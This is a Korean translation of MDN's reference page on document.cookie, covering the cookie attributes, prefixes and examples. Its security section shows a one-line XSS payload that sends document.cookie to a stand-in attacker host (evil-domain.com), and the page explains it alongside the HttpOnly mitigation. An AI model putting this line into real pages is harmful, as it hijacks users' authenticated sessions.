# Document.cookie
[``Document``](https://developer.mozilla.org/ko/docs/Web/API/Document) ``cookie`` 는 document와 연관된 [cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies) 를 읽고 쓸 수 있게 해준다. 쿠키의 실제값에 대한 getter 와 setter로 작동한다.

## 문법
### 이 위치에서 액세스 할 수있는 모든 쿠키 읽기
~~~js
allCookies = document.cookie;
~~~
위 코드에서 allCookies 세미콜론으로 구분되는 모든 쿠키 리스트의 문자열이다. (다른 말로 key=value)

### 새 쿠키 작성
~~~js
document.cookie = newCookie;
~~~
위 코드에서 newCookie는 key = value 형식의 문자열입니다. 이 방법을 사용하면 한 번에 하나의 쿠키 만 설정 / 업데이트 할 수 있습니다. 다음 사항도 고려하십시오.
- 다음 쿠키 속성 값은 선택적으로 키-값 쌍 뒤에 올 수 있으며 설정 / 업데이트 할 쿠키를 지정하고 앞에 세미콜론 구분 기호가 붙습니다.
    - ``; path = path`` (예 : '``/``', '``/mydir``') 지정하지 않으면 현재 문서 위치의 현재 경로가 기본값입니다.
    > __참고__ : Gecko 6.0 이전에는 따옴표가있는 경로가 실제 경로 문자열을 둘러싼 구분 기호가 아니라 따옴표가 문자열의 일부인 것처럼 처리되었습니다. 이것은 수정되었습니다.
    p
    - ; domain = domain (예 : 'example.com'또는 'subdomain.example.com'). 지정하지 않으면 기본값은 현재 문서 위치의 호스트 부분입니다. 이전 사양과 달리 도메인 이름의 선행 점은 무시되지만 브라우저는 이러한 점을 포함하는 쿠키 설정을 거부 할 수 있습니다. 도메인이 지정되면 하위 도메인이 항상 포함됩니다.
    > __참고__ : 도메인은 JavaScript 원본의 도메인과 일치해야합니다. 쿠키를 외부 도메인으로 설정하면 자동으로 무시됩니다.
    - ``max-age = max-age-in-seconds`` (예 : ``60 * 60 * 24 * 365`` 또는 1 년 31536000)
    - ``; expires = date-in-GMTString-format`` 만기도 ``max-age`` 도 지정되지 않으면 세션이 끝날 때 만기됩니다.
        - 이 값의 형식 지정에 대한 도움말은 [__``Date.toUTCString``__](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date/toUTCString) () (en-US)을 참조하십시오.

    > 사용자 개인 정보 보호가 우려되는 경우 웹 앱 구현은 브라우저에 의존하는 대신 특정 시간 초과 후에 쿠키 데이터를 무효화하는 것이 중요합니다. 많은 브라우저에서 사용자가 쿠키가 만료되지 않도록 지정할 수 있으며, 이는 반드시 안전하지는 않습니다.  

    - ``;secure`` 보안 프로토콜을 통해서만 https로 전송되는 ``보안 쿠키.`` Chrome 52 이전에는이 플래그가 http 도메인의 쿠키와 함께 나타날 수있었습니다.

    - ``;samesite`` [SameSite](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#samesite_cookies)는 브라우저가 교차 사이트 요청과 함께이 쿠키를 전송하지 못하도록합니다. 가능한 값은 lax, strict 또는 none입니다.

        - ``lax`` 값 값은 모든 동일한 사이트 요청 및 최상위 탐색 GET 요청에 대해 쿠키를 보냅니다. 이것은 사용자 추적에 충분하지만 많은 CSRF 공격을 방지합니다. 이것은 최신 브라우저의 기본값입니다.

        -``엄격한 값`` 은 일반 링크를 따르는 경우에도 브라우저가 모든 교차 사이트 브라우징 컨텍스트에서 대상 사이트로 쿠키를 전송하지 못하도록합니다.

        - ``none`` 값은 제한이 적용되지 않음을 명시 적으로 나타냅니다. 쿠키는 모든 요청 (교차 사이트 및 동일 사이트 모두)에서 전송됩니다.

- 쿠키 값 문자열은 [encodeURIComponent()](https://developer.mozilla.org/ko/docs/Web/JavaScript/Reference/Global_Objects/encodeURIComponent)를 사용하여 문자열에 쉼표, 세미콜론 또는 공백 (쿠키 값에서 허용되지 않음)이 포함되지 않도록 할 수 있습니다.

- 일부 사용자 에이전트 구현은 다음 쿠키 접두사를 지원합니다.
    - ``__Secure-`` 보안 채널을 통해 전송 된 요청에만 쿠키를 포함해야 함을 브라우저에 알립니다.
    - ``__Host-`` 안전한 출처의 쿠키 만 사용하도록 제한하는 것 외에도 쿠키의 범위가 서버에서 전달한 경로 속성으로 제한된다는 것을 브라우저에 알립니다. 서버가 경로 속성을 생략하면 요청 URI의 "디렉토리"가 사용됩니다. 또한 도메인 속성이 없어야한다는 신호를 보내 쿠키가 다른 도메인으로 전송되는 것을 방지합니다. Chrome의 경우 경로 속성은 항상 원본이어야합니다.

    > 대시는 접두사의 일부로 간주됩니다.  

    > 이러한 플래그는 ``보안 속성``으로 만 설정할 수 있습니다.

> __참고__ : 위의 코드에서 볼 수 있듯이 ``document.cookie``는 기본 setter 및 getter 함수가있는 접근 자 속성이므로 결과적으로 값이있는 데이터 속성이 아닙니다. 작성한 내용은 읽은 내용과 동일하지 않습니다. 항상 JavaScript 인터프리터에 의해 조정됩니다.

## Examples (예제)

### 예제 # 1 : 간단한 사용법
~~~js
document.cookie = "name=oeschger";
document.cookie = "favorite_food=tripe";
function alertCookie() {
  alert(document.cookie);
}
~~~
~~~html
<button onclick="alertCookie()">Show cookies</button>
~~~

## Security (보안)
``경로 속성``은 다른 경로에서 쿠키를 무단으로 읽는 것을 방지하지 않는다는 점에 유의해야합니다. 예를 들어 쿠키 경로로 숨겨진 ``<iframe>`` 요소를 만든 다음이 iframe의 ``contentDocument.cookie`` 속성에 액세스하여 DOM을 사용하여 쉽게 우회 할 수 있습니다. 쿠키를 보호하는 유일한 방법은 [동일한 출처 정책](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)으로 인해 다른 도메인 또는 하위 도메인을 사용하는 것입니다.  
  
쿠키는 웹 애플리케이션에서 사용자와 인증 된 세션을 식별하는 데 자주 사용됩니다. 따라서 웹 응용 프로그램에서 쿠키를 훔치면 인증 된 사용자의 세션을 가로 챌 수 있습니다. 쿠키를 훔치는 일반적인 방법에는 소셜 엔지니어링을 사용하거나 애플리케이션의 XSS 취약성을 악용하는 것이 포함됩니다.

~~~js
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
~~~

``HTTPOnly`` 쿠키 속성은 Javascript를 통한 쿠키 값에 대한 액세스를 방지하여이 공격을 완화하는 데 도움이 될 수 있습니다. [쿠키 및 보안](https://humanwhocodes.com/blog/2009/05/12/cookies-and-security/)에 대해 자세히 알아보십시오.

## Notes (메모)
- Firefox 2부터는 클라이언트 측 저장소에 대한 더 나은 메커니즘 인 [WHATWG DOM 저장소](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API)를 사용할 수 있습니다.

- 만료 시간을 0으로 업데이트하여 쿠키를 삭제할 수 있습니다.

- 쿠키가 많을수록 각 요청에 대해 서버와 클라이언트간에 더 많은 데이터가 전송됩니다. 이렇게하면 각 요청이 느려집니다. 

- "클라이언트 전용"데이터를 유지하려는 경우 [WHATWG DOM 저장소](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API)를 사용하는 것이 좋습니다.

- [RFC 2965](https://www.ietf.org/rfc/rfc2965.txt) (섹션 5.3, "구현 제한")는 쿠키 키 또는 값 크기의 __최대 길이가 없어야 함__ 을 지정하고 구현시 임의의 큰 쿠키를 지원하도록 권장합니다. 각 브라우저의__ 구현 최대 값__ 은 반드시 다를 수 있으므로 개별 브라우저 설명서를 참조하십시오.

``document.cookie`` 접근 자 속성 구문의 이유는 다른 클라이언트-클라이언트 저장 방법 (예 : localStorage)과 다른 쿠키의 클라이언트-서버 특성 때문입니다.

### 서버는 클라이언트에게 쿠키를 저장하도록 지시합니다.
> HTTP/1.0 200 OK  
> Content-type: text/html  
> Set-Cookie: cookie_name1=cookie_value1  
> Set-Cookie: cookie_name2=cookie_value2; expires=Sun, 16 Jul3567 06:23:41 GMT
> 
> [content of the page here]

### 클라이언트는 이전에 저장된 쿠키를 서버로 다시 보냅니다.
> GET /sample_page.html HTTP/1.1  
> Host: www.example.org  
> Cookie: cookie_name1=cookie_value1; > cookie_name2=cookie_value2  
> Accept: ``*/*``

[내용출처 MDN Domcument.cookie (쿠키)](https://developer.mozilla.org/ko/docs/Web/API/Document/cookie)